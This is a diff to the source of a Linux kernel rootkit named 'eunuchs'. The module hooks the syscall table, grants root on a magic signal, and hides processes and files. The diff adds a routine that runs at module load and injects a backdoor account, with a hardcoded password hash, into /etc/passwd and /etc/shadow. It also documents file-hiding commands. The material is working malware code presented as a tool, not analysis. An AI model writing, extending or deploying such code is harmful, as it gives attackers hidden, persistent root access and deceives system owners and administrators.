@@ -9,8 +9,7 @@
  * https://www.tldp.org/LDP/lkmpg/2.6/lkmpg.pdf
  *
  * TODO:
- * hide/show files
- * /etc/passwd & /etc/shadow
+ * hide backdoor contents from user
  *
  * Requirements to build:
  *  `sudo apt-get install build-essential linux-headers-($uname -r)`
@@ -56,7 +55,8 @@
  *  icanhazr00t?                    - elevates the user to root credentials
  *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
  *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
- *  ohaiplzhidefile ext
+ *  ohaiplzhidefile [ext]           - hide all files ending in [ext]
+ *  ohaiplzshowfile [ext]           - show all files ending in [ext]
  **/
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -77,6 +77,14 @@ static unsigned long *sct = 0xc167b180;
 /* magic number for our kill switch to elevate credentials */
 #define EUNUCHS_MAGIC_SIGNAL 42 /* 42 - the answer to all of life's mysteries */
 
+/**
+ * what lines should we be injecting into /etc/passwd and /etc/shadow?
+ * Default account that is injected is
+ *  user -> me0wza
+ *  pass -> w0wza
+ **/
+#define EUNUCHS_PASSWD_MOD "\nme0wza:x:1000:1000::/:/bin/sh\n"
+#define EUNUCHS_SHADOW_MOD "\nme0wza:$6$ndHcTwCTVHYKicfm$rucI7fX275L7zHK/wQ.olS8tt3xFvhFCut0SdVAQn2Rt9kHTi4K8ftjvImMM.9w2CKW6HgDw/lzzdoh0Vt4d10:18227:0:99999:7:::\n"
 
 #include <linux/init.h>
 #include <linux/module.h>
@@ -93,7 +101,7 @@ static unsigned long *sct = 0xc167b180;
 #include <linux/string.h>       // string manipulation
 #include <linux/dirent.h>       // directory entries
 #include <linux/list.h>         // linked lists
-#include <linux/cred.h>         // credentials, for suid
+#include <linux/cred.h>         // credentials, for setuid
 #include <linux/fdtable.h>      // for fcheck_files
 
 /* undef this to disable debug messages/functions */
@@ -860,6 +868,121 @@ static void eunuchs_lists_free(void)
 /* list of all modules (what lsmod shows) */
 static struct list_head *mod_list = NULL;
 
+/** 
+ * eunuchs_install_backdoor() -
+ *  Installs a backdoor account in /etc/passwd and /etc/shadow
+ **/
+static int eunuchs_install_backdoor(void)
+{
+    mm_segment_t oldfs;
+    struct file *f = NULL;
+    __kernel_long_t size = 0;
+    char *buf = NULL;
+    int res = 0;
+    unsigned long long pos = 0;
+    struct kstat ks;
+
+    oldfs = get_fs();
+    set_fs(get_ds());
+
+    /* work on /etc/passwd */
+    vfs_stat("/etc/passwd", &ks);
+    size = ks.size;
+    debug("passwd %ld bytes\n", size);
+    f = filp_open("/etc/passwd", O_RDWR, NULL);
+
+    if(IS_ERR(f))
+    {
+        debug("failed to open /etc/passwd: %ld\n", PTR_ERR(f));
+        res = (int)f;
+        goto fail;
+    }
+
+    /* do stuff with passwd */
+    buf = kmalloc(sizeof(char) * (size + 1), GFP_KERNEL);
+    if(!buf)
+    {
+        debug("kmalloc failed\n");
+        res = (int)buf;
+        goto fail;
+    }
+
+    /* if(IS_ERR(res = kernel_read(f_passwd, passwd_buf, size + 1, pos))) */
+    if(IS_ERR(res = vfs_read(f, buf, size, &pos)))
+    {
+        debug("vfs_read failed on passwd: %ld\n", PTR_ERR(res));
+        goto fail;
+    }
+    /* does the file already contain the backdoor account? don't add it again */
+    if(!strnstr(buf, EUNUCHS_PASSWD_MOD, size))
+    {
+        if(IS_ERR(res = vfs_write(f, EUNUCHS_PASSWD_MOD, strlen(EUNUCHS_PASSWD_MOD), &pos)))
+        {
+            debug("vfs_write failed on passwd\n");
+            goto fail;
+        }
+    }
+    else
+    {
+        debug("passwd already contains backdoor\n");
+    }
+
+    kfree(buf);
+    buf = NULL;
+    filp_close(f, NULL);
+    f = NULL;
+    size = 0; res = 0; pos = 0;
+
+    /* work on /etc/shadow */
+    vfs_stat("/etc/shadow", &ks);
+    size = ks.size;
+    debug("shadow %ld bytes\n", size);
+
+    if(IS_ERR(f = filp_open("/etc/shadow", O_RDWR, NULL)))
+    {
+        debug("failed to open /etc/shadow: %ld\n", PTR_ERR(f));
+        res = (int)f;
+        goto fail;
+    }
+
+    /* do stuff with passwd */
+    buf = kmalloc(sizeof(char) * (size + 1), GFP_KERNEL);
+    if(!buf)
+    {
+        debug("kmalloc failed\n");
+        res = (int)buf;
+        goto fail;
+    }
+
+    if(IS_ERR(res = vfs_read(f, buf, size, &pos)))
+    {
+        debug("kernel_read failed on shadow: %ld\n", PTR_ERR(res));
+        goto fail;
+    }
+
+    /* does the file already contain the backdoor account? don't add it again */
+    if(!strnstr(buf, EUNUCHS_SHADOW_MOD, size))
+    {
+        if(IS_ERR(res = vfs_write(f, EUNUCHS_SHADOW_MOD, strlen(EUNUCHS_SHADOW_MOD), &pos)))
+        {
+            goto fail;
+        }
+    }
+    else
+    {
+        debug("shadow already contains backdoor\n");
+    }
+
+fail:
+    if(buf)
+        kfree(buf);
+    if(f > 0)
+        filp_close(f, NULL);
+
+    set_fs(oldfs);
+    return 0;
+}
+
 /**
  * eunuchs_hide_lkm() -
  *  Hides the module from `lsmod`
@@ -913,13 +1036,6 @@ static int eunuchs_hooks_install(void)
     sct[__NR_setuid32] = (void *)&eunuchs_setuid;
     sct[__NR_kill] = (void *)&eunuchs_kill;
 
-
-    /* orig_stat = (typeof(sys_stat) *)sct[__NR_stat]; */
-    /* sct[__NR_stat] = (void *)&eunuchs_stat; */
-    /*  */
-    /* orig_lstat = (typeof(sys_lstat) *)sct[__NR_lstat]; */
-    /* sct[__NR_lstat] = (void *)&eunuchs_lstat; */
-
     return 0;
 }
 
@@ -960,6 +1076,9 @@ static int eunuchs_init(void)
     eunuchs_hooks_install();
     process_hide_init();
     cr0_disable_write();
+
+    /* install backdoor account */
+    eunuchs_install_backdoor();
 
     /* hide the module */
     /* eunuchs_hide_lkm(); */
